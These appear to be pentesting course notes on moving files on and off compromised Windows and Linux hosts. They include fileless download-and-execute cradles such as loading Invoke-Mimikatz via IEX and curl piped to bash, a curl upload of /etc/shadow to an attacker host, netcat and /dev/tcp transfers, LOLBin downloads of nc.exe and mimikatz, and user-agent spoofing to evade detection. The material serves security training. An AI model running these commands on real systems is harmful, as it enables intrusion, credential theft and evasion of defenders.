- Application whitelisting blocking your preferred tools (e.g., PowerShell blocked)
- Network firewalls blocking specific ports (FTP/21, SMB/445 blocked outbound)
- Web content filtering blocking access to GitHub, Dropbox, etc.
- AV/EDR detecting known transfer tools

Real-world scenario from the module: RCE gained on IIS via unrestricted file upload → web shell → reverse shell → PowerShell blocked → Certutil blocked by web filter → FTP blocked by firewall → SMB (port 445) was allowed → success using Impacket smbserver.

The lesson: always have multiple techniques ready and adapt to what the environment allows.

Windows File Transfer Methods

PowerShell Base64 Encode & Decode

Use case: When you have terminal access but no network path (or want to avoid network-based detection). You encode the file as base64 text, copy-paste it into the target terminal, and decode it back.

Why verify with MD5? To confirm the file wasn't corrupted during the copy-paste transfer.

Step 1 — Check the MD5 hash of the file on your attack host (Pwnbox/Kali)

md5sum id_rsa
# Output: 4e301756a07ded0a2dd6953abf015278  id_rsa

What this does: Generates a 128-bit fingerprint of the file. You'll compare this hash on the target after transfer to confirm integrity.

Step 2 — Base64 encode the file on your attack host

cat id_rsa | base64 -w 0; echo

Breakdown:
- cat id_rsa — reads the file
- | base64 -w 0 — encodes it to base64 with -w 0 forcing everything onto one single line (no line wrapping), which is essential for copy-pasting
- ; echo — adds a newline at the end so the terminal prompt doesn't smash into the output

Copy the entire base64 string output.

Step 3 — Decode and write the file on the Windows target (PowerShell)

[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<PASTE_BASE64_HERE>"))

Breakdown:
- [Convert]::FromBase64String(...) — decodes the base64 string back to raw bytes
- [IO.File]::WriteAllBytes(...) — writes those raw bytes to a file on disk
- Limitation: Windows cmd.exe has a max string length of 8,191 characters — for large files, this method won't work via cmd, only PowerShell

Step 4 — Confirm integrity on the Windows target

Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
🔍 What you're looking for The hash should match exactly what you got from md5sum on your attack host. If it doesn't, the file is corrupted and won't work correctly.

PowerShell Web Downloads

Use case: Most environments allow outbound HTTP (80) and HTTPS (443). This is the most common and reliable transfer method.

Tool: System.Net.WebClient — a built-in .NET class available in all PowerShell versions.

WebClient Methods Reference

Method Description
DownloadFile Downloads to a local file (touches disk)
DownloadFileAsync Same but non-blocking
DownloadData Returns raw bytes
DownloadString Returns content as a string (useful for fileless execution)
DownloadStringAsync Same but non-blocking
OpenRead Returns a Stream

DownloadFile — saves to disk

(New-Object Net.WebClient).DownloadFile(
    'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',
    'C:\Users\Public\Downloads\PowerView.ps1'
)

Breakdown:
- New-Object Net.WebClient — creates an instance of the WebClient class
- .DownloadFile('<URL>', '<output path>') — downloads from URL and saves to the specified local path
- This writes to disk — it may be caught by AV

DownloadFileAsync — non-blocking

(New-Object Net.WebClient).DownloadFileAsync(
    'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1',
    'C:\Users\Public\Downloads\PowerViewAsync.ps1'
)

Use when: You're in a scenario where blocking the thread is a problem (e.g., a time-sensitive shell).

DownloadString + IEX — fileless execution (never touches disk)

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

# Alternative using pipeline
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX

Why this is powerful:
- DownloadString pulls the script content as a string
- IEX (alias for Invoke-Expression) executes that string directly in memory
- The script never touches disk → harder to detect with traditional AV
- IEX also accepts pipeline input as shown above

Invoke-WebRequest — PowerShell 3.0+

Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

# Pipe directly to IEX for fileless execution
Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Aliases: iwr, curl, wget all work as aliases for Invoke-WebRequest
Note: Noticeably slower than Net.WebClient for large files.

📚 Harmj0y's PowerShell download cradles list: https://gist.github.com/HarmJ0y/bb48307ffa663256e239

Common Errors & Fixes

Error 1: Internet Explorer first-launch not completed

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available...

Fix:

Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

-UseBasicParsing bypasses the IE dependency entirely.

Error 2: SSL/TLS certificate not trusted

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel."

Fix:

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

What this does: Forces PowerShell to accept any SSL certificate, including self-signed ones. Run this before your download command.

SMB Downloads

Use case: SMB (TCP/445) is extremely common in Windows enterprise environments. If outbound SMB is allowed, this is fast and reliable.

Tool: Impacket — impacket-smbserver

Set up an SMB server on your attack host

sudo impacket-smbserver share -smb2support /tmp/smbshare

Breakdown:
- share — the name of the SMB share (you'll reference this as \\IP\share)
- -smb2support — enables SMB2 support (required for modern Windows)
- /tmp/smbshare — the local directory being shared

Copy a file from the SMB server (on Windows target)

copy \\192.168.220.133\share\nc.exe

What next: You now have nc.exe locally. Use it for your reverse shell or pivot.

Error: Unauthenticated guest access blocked

You can't access this shared folder because your organization's security policies block unauthenticated guest access.

Fix — add credentials to your SMB server:

sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Then mount it on Windows with credentials:

net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe

Breakdown:
- net use n: — maps the SMB share to the drive letter n:
- /user:test test — authenticates with username test and password test
- Then you can use copy normally from drive n:

FTP Downloads

Use case: When HTTP/SMB are blocked but FTP (TCP/21) is allowed outbound.

Tool: Python's pyftpdlib module — sets up a quick FTP server on your attack host.

Install pyftpdlib on your attack host

sudo pip3 install pyftpdlib

Start the FTP server

sudo python3 -m pyftpdlib --port 21

Why port 21? Default pyftpdlib port is 2121, but we specify 21 to match the standard FTP port. Anonymous authentication is enabled by default.

Download from FTP using PowerShell (on Windows target)

(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')

Download using FTP command file (non-interactive shell)

Why: If you don't have an interactive shell, you can't type FTP commands manually. Instead, script them into a file.

echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt

Breakdown:
- echo ... > ftpcommand.txt — creates the file with the first command
- echo ... >> ftpcommand.txt — appends subsequent commands
- ftp -v -n -s:ftpcommand.txt — runs FTP in script mode (-s) using our command file, -n disables auto-login, -v shows responses

Upload Operations - Windows

PowerShell Base64 Encode for Upload

# Encode the file to base64
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

# Get MD5 for verification
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

What next: Copy the base64 output, go to your Linux attack host, and decode it.

Decode on Linux attack host:

echo <BASE64_STRING> | base64 -d > hosts
md5sum hosts
# Verify the hash matches what you got from Windows

PowerShell Web Upload (using uploadserver)

Tool: uploadserver — a Python HTTP server module with file upload capability.

On your attack host:

pip3 install uploadserver
python3 -m uploadserver
# Listening on port 8000, upload available at /upload

On Windows target — download PSUpload.ps1 and use it:

IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

PSUpload.ps1 uses Invoke-RestMethod internally to POST the file to the uploadserver.

PowerShell Base64 Web Upload (via Netcat)

$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64

On attack host, catch with Netcat:

nc -lvnp 8000
# The POST body will contain the base64-encoded file
echo <BASE64> | base64 -d -w 0 > hosts

SMB Upload via WebDAV

Why WebDAV? Most organizations block outbound SMB (TCP/445). WebDAV runs SMB-like operations over HTTP (TCP/80 or 443), which is usually allowed.

How it works: When you use \\server\share, Windows first tries SMB. If SMB fails, it automatically falls back to HTTP (WebDAV).

Install WebDAV modules on attack host:

sudo pip3 install wsgidav cheroot

wsgidav: The WebDAV server implementation
cheroot: The HTTP server engine that wsgidav runs on
GitHub: https://github.com/mar10/wsgidav

Start the WebDAV server:

sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

Connect from Windows target:

dir \\192.168.49.128\DavWWWRoot

DavWWWRoot is a special Windows keyword that tells the WebDAV mini-redirector driver you want the root of the WebDAV server. If a specific folder exists on the server, you can use that name instead.

Upload a file:

copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\

FTP Upload

Start FTP server with write permissions:

sudo python3 -m pyftpdlib --port 21 --write

--write is required — without it, anonymous users can't upload.

Upload using PowerShell:

(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')

Upload using FTP command file:

echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt

PUT is the FTP command for uploading (vs GET for downloading).

Linux File Transfer Methods

Base64 Encoding & Decoding - Linux

Same concept as Windows — useful when no network transfer is available.

Check MD5 on attack host:

md5sum id_rsa

Encode the file:

cat id_rsa | base64 -w 0; echo

Decode on the Linux target:

echo -n '<BASE64_STRING>' | base64 -d > id_rsa

Verify:

md5sum id_rsa
# Should match the original hash

💡 Reverse tip: You can also go target → attack host. On the compromised target: cat file | base64 -w 0, copy output, decode on your Pwnbox.

Web Downloads with Wget and cURL

The two most common Linux download tools — almost always present on any Linux system.

wget

wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

Breakdown:
- -O /tmp/LinEnum.sh — specifies the output file path (capital O)

cURL

curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

Breakdown:
- -o /tmp/LinEnum.sh — specifies the output file path (lowercase o)

Fileless Attacks Using Linux

Run scripts directly in memory via pipes — nothing written to disk.

cURL fileless execution

curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

Downloads LinEnum.sh and immediately pipes it into bash for execution. No file saved.

wget fileless execution

wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Breakdown:
- -q — quiet mode (no wget progress output)
- -O- — output to stdout (the - means stdout instead of a file)
- | python3 — pipe the script into python3 for execution

Download with Bash /dev/tcp

Use case: When wget, curl, and all other tools are unavailable. As long as Bash 2.04+ is installed (compiled with --enable-net-redirections), you can use the built-in /dev/tcp pseudo-device.

# Step 1: Open TCP connection to the web server
exec 3<>/dev/tcp/10.10.10.32/80

# Step 2: Send HTTP GET request
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3

# Step 3: Read and print the response
cat <&3

Breakdown:
- exec 3<>/dev/tcp/10.10.10.32/80 — opens file descriptor 3 as a bidirectional TCP connection to the target IP on port 80
- >&3 — writes the GET request to that connection
- cat <&3 — reads the response from the connection

SSH & SCP

Use case: When SSH (TCP/22) is available — gives you an encrypted channel for transfers.

Tool: SCP (Secure Copy Protocol) — comes with SSH.

Enable SSH on your attack host

sudo systemctl enable ssh
sudo systemctl start ssh

Verify SSH is listening:

netstat -lnpt
# Look for 0.0.0.0:22 in the output

Download file from target to your attack host

scp user@10.10.10.32:/root/myroot.txt .

Breakdown:
- user@10.10.10.32:/root/myroot.txt — remote source (user@host:path)
- . — save to current directory on your local machine

Upload file from your attack host to target

scp /etc/passwd user@10.10.10.32:/home/htb-student/

SCP syntax is like cp but with remote paths specified as user@host:path

💡 Tip: Create a temporary user account for file transfers to avoid exposing your primary credentials on the remote system.

Upload Operations - Linux

Web Upload with HTTPS (uploadserver)

Why HTTPS? Encrypts the transfer, preventing defenders from seeing what you're exfiltrating in transit.

On attack host — install uploadserver:

sudo python3 -m pip install --user uploadserver

Create a self-signed certificate:

openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Breakdown:
- -x509 — self-signed certificate (not CA-signed)
- -out server.pem -keyout server.pem — put both cert and key in one file
- -newkey rsa:2048 — generate a new 2048-bit RSA key
- -nodes — no passphrase on the private key
- -sha256 — use SHA256 hashing
- -subj '/CN=server' — skips the interactive prompts

Start HTTPS upload server:

mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

Upload from compromised Linux target:

curl -X POST https://192.168.49.128/upload \
    -F 'files=@/etc/passwd' \
    -F 'files=@/etc/shadow' \
    --insecure

Breakdown:
- -X POST — HTTP POST method
- -F 'files=@/etc/passwd' — form-file upload (@ means read from file)
- --insecure — accept self-signed certificate (we trust it because we made it)

Alternative: Spin up a quick web server for download

Sometimes you just need the compromised machine to host a file so your attack host can pull it.

# Python 3
python3 -m http.server
# Serves current directory on port 8000

# Python 2.7
python2.7 -m SimpleHTTPServer

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -ehttpd . -p8000

Then on your attack host:

wget 192.168.49.128:8000/filetotransfer.txt

Note: You're transferring from the target to your Pwnbox here — this is a download on your end, but the target is the server.

SCP Upload from target to attack host

scp /etc/passwd user@192.168.49.128:/home/htb-student/

Transferring Files with Code

When native tools are blocked but programming languages are available.

Python

Python 2:

python2.7 -c 'import urllib; urllib.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

Python 3:

python3 -c 'import urllib.request; urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

Python 3 Upload (using requests):

python3 -c 'import requests; requests.post("http://192.168.49.128:8000/upload", files={"files": open("/etc/passwd","rb")})'

Breakdown of the upload one-liner:
- import requests — Python HTTP library
- requests.post(url, files=...) — sends a multipart POST request
- open("/etc/passwd","rb") — opens the file in read-binary mode

PHP

PHP is used by ~77% of server-side websites — likely available on web servers you compromise.

Using file_get_contents() + file_put_contents():

php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

Using fopen() (streaming):

php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

Fileless — pipe to bash:

php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash

Note: @file() reads URL into an array of lines. The @ suppresses error messages. This only works if fopen URL wrappers are enabled in php.ini.

Ruby

ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'

Perl

perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'

JavaScript (Windows - via cscript.exe)

Create wget.js:

var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));

Execute:

cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1

Breakdown:
- cscript.exe — Windows Script Host for command-line scripts
- /nologo — suppress the Microsoft branding banner
- Arguments(0) = URL, Arguments(1) = output filename

VBScript (Windows)

Create wget.vbs:

dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with

Execute:

cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1

Why VBScript? It's installed by default on every Windows desktop release since Windows 98 — it's almost always available.

Miscellaneous File Transfer Methods

Netcat & Ncat

Tool overview:
- Netcat (nc): Originally released 1995, reads/writes over TCP/UDP. Extremely versatile — "the Swiss army knife of networking."
- Ncat: Modern reimplementation by the Nmap Project. Adds SSL, IPv6, SOCKS proxies, HTTP proxies, and more.

Note on HTB Pwnbox: nc, ncat, and netcat all point to Ncat.

Method 1: Target listens, attacker sends

On compromised machine (target), listen for the file:

# Using Netcat
nc -l -p 8000 > SharpKatz.exe

# Using Ncat
ncat -l -p 8000 --recv-only > SharpKatz.exe

--recv-only tells Ncat to close the connection once the transfer is done.

On attack host, send the file:

# First download the file to your attack host
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe

# Send with Netcat
nc -q 0 192.168.49.128 8000 < SharpKatz.exe

# Send with Ncat
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe

-q 0 tells Netcat to close immediately after sending. --send-only is the Ncat equivalent.

Method 2: Attacker listens, target connects (bypass inbound firewall rules)

Why this matters: If the target has a firewall blocking inbound connections, you make your attack host listen and have the target connect out to you.

On attack host, listen and serve the file:

# Netcat
sudo nc -l -p 443 -q 0 < SharpKatz.exe

# Ncat
sudo ncat -l -p 443 --send-only < SharpKatz.exe

On compromised machine, connect and receive:

# Netcat
nc 192.168.49.128 443 > SharpKatz.exe

# Ncat
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe

Method 3: Using /dev/tcp (when nc isn't available on target)

On attack host (serves file):

sudo nc -l -p 443 -q 0 < SharpKatz.exe
# or
sudo ncat -l -p 443 --send-only < SharpKatz.exe

On compromised machine (receives via bash):

cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe

Opens a TCP connection to your attack host and redirects what comes back into a file. No nc needed — just bash.

PowerShell Session File Transfer (WinRM)

Use case: HTTP, HTTPS, and SMB are all unavailable, but WinRM (TCP/5985 HTTP, TCP/5986 HTTPS) is open between Windows machines.

Requirement: Admin access on the target, or membership in Remote Management Users group.

Check if WinRM port is open:

Test-NetConnection -ComputerName DATABASE01 -Port 5985
# TcpTestSucceeded : True = port is open

Create a PowerShell Remoting session:

$Session = New-PSSession -ComputerName DATABASE01

Copy file TO the remote session:

Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

Copy file FROM the remote session:

Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session

Why this is useful: WinRM traffic often isn't filtered as aggressively as SMB, and it's an expected admin protocol in Windows environments.

RDP File Transfer

Use case: You have GUI RDP access to a Windows target.

Method 1: Copy-paste — Right-click file → Copy → Paste into RDP session (works for small files).

Method 2: Mount local folder via rdesktop:

rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'

Method 3: Mount local folder via xfreerdp:

xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer

Both commands mount your local directory as a network drive inside the RDP session, accessible at \\tsclient\linux.

Method 4: Windows mstsc.exe — In the RDP client → Local Resources tab → More → Drives → check the drive you want to share.

Security note: The mounted drive is only accessible to your RDP session — other users on the target machine cannot see it, even if they hijack the RDP session.

Protected File Transfers

⚠️ Important: As a pentester you may access sensitive data (credential files, NTDS.dit, PII, etc.). Always encrypt data before transferring, and never exfiltrate actual PII — use dummy data for DLP testing.

File Encryption on Windows — Invoke-AESEncryption.ps1

What it does: AES-256 encryption/decryption of files or strings, implemented as a PowerShell function.

Import the module:

Import-Module .\Invoke-AESEncryption.ps1

Encrypt a file:

Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
# Creates: scan-results.txt.aes

Decrypt a file:

Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd" -Path .\scan-results.txt.aes

Encrypt a string:

Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"
# Returns base64-encoded ciphertext

🔑 Best practice: Use a unique, strong password for every client engagement. If one password leaks, it shouldn't decrypt files from other engagements.

File Encryption on Linux — OpenSSL

OpenSSL is almost always present on Linux systems. It can encrypt files using strong ciphers.

Encrypt:

openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

Breakdown:
- enc -aes256 — AES-256-CBC encryption
- -iter 100000 — 100,000 iterations for key derivation (makes brute-force harder)
- -pbkdf2 — uses Password-Based Key Derivation Function 2 (industry standard)
- -in /etc/passwd — input file
- -out passwd.enc — output encrypted file

Decrypt:

openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd

-d flag switches to decryption mode. Same parameters must match the encryption step.

Catching Files over HTTP/S with Nginx

Why Nginx over Apache? Apache's PHP module executes .php files automatically — if an attacker uploads a web shell, Apache might run it. Nginx doesn't have this problem by default, making it safer for a controlled upload endpoint.

Create the upload directory:

sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

Create Nginx config (/etc/nginx/sites-available/upload.conf):

server {
    listen 9001;
    location /SecretUploadDirectory/ {
        root /var/www/uploads;
        dav_methods PUT;
    }
}

dav_methods PUT — enables WebDAV PUT for file uploads.

Enable and start:

sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo systemctl restart nginx.service

If port 80 is already in use (common on Pwnbox), remove the default config:

sudo rm /etc/nginx/sites-enabled/default

Check for errors:

tail -2 /var/log/nginx/error.log

Upload a file using cURL PUT:

curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt

Verify the upload:

sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt

Living off The Land (LOLBAS & GTFOBins)

"Living off the Land" — coined by Christopher Campbell (@obscuresec) & Matt Graeber (@mattifestation) at DerbyCon 3. Using legitimate, pre-installed system binaries for offensive purposes.

Why use LOLBins?
- Application whitelisting may block unknown executables, but won't block signed Windows binaries
- Less suspicious — these are legitimate system tools
- Often excluded from AV scanning

Key Resources

  • 🔗 LOLBAS (Windows): https://lolbas-project.github.io/ — Search /download or /upload
  • 🔗 GTFOBins (Linux): https://gtfobins.github.io/ — Search +file download or +file upload

Windows LOLBins

Certutil — Download

certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe

Originally a certificate utility. Casey Smith (@subTee) discovered it can download arbitrary files. Acts like a Windows wget. Note: AMSI now detects this as malicious — may be blocked by modern AV.

Bitsadmin — Download

bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe

PowerShell BITS:

Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"

BITS (Background Intelligent Transfer Service) — designed for Windows Update and similar. Checks host and network utilization to minimize impact. Often whitelisted. Supports HTTP and SMB shares.

CertReq.exe — Upload

# On attack host, listen with Netcat
sudo nc -lvnp 8000

# On Windows target, upload the file
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini

The file content arrives in the Netcat session as the POST body. Copy-paste to save it. Note: Requires a version of certreq.exe that supports -Post parameter.

GfxDownloadWrapper.exe — Download (Intel Graphics Driver)

GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"

Intel Graphics Driver — installed on many systems. Contains legitimate download functionality that can be repurposed. Often excluded from application whitelisting rules because it's a signed Intel binary.

Linux GTFOBins — OpenSSL File Transfer

On attack host, create cert and start server:

openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

On compromised machine, download:

openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh

Why OpenSSL? Transfers over encrypted TLS — harder for IDS to inspect the payload. Also, openssl is almost universally installed and whitelisted.

Detection

User Agent String Detection

When tools make HTTP requests, they identify themselves via the User-Agent header. Defenders can build whitelists of legitimate user agents and alert on anomalies.

Common PowerShell User Agents (detected by defenders):

Tool User-Agent
Invoke-WebRequest / Invoke-RestMethod Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
WinHttpRequest Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
Msxml2.XMLHTTP Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
Certutil Microsoft-CryptoAPI/10.0
BITS Microsoft BITS/7.8

🔗 User Agent reference: https://useragentstring.com/
🔗 User Agent list: https://useragentstring.com/pages/useragentstring.php

Evading Detection

Change the PowerShell User Agent

If default PowerShell user agents are blacklisted, you can spoof a browser's user agent.

List available user agents:

[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name, @{label="User Agent"; Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Available options: InternetExplorer, FireFox, Chrome, Opera, Safari

Download with Chrome user agent:

$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"

The request will show AppleWebKit/534.6 (KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6 in the server logs — looks like a normal browser request.

Use LOLBAS / GTFOBins for Whitelisting Bypass

If PowerShell and Netcat are both blocked by application whitelisting, find a signed system binary on LOLBAS/GTFOBins that has download capability and is allowed by the whitelist.

Example — GfxDownloadWrapper.exe (Intel GPU driver binary):

GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"

Signed by Intel → almost certainly whitelisted. Contains legitimate download functionality.
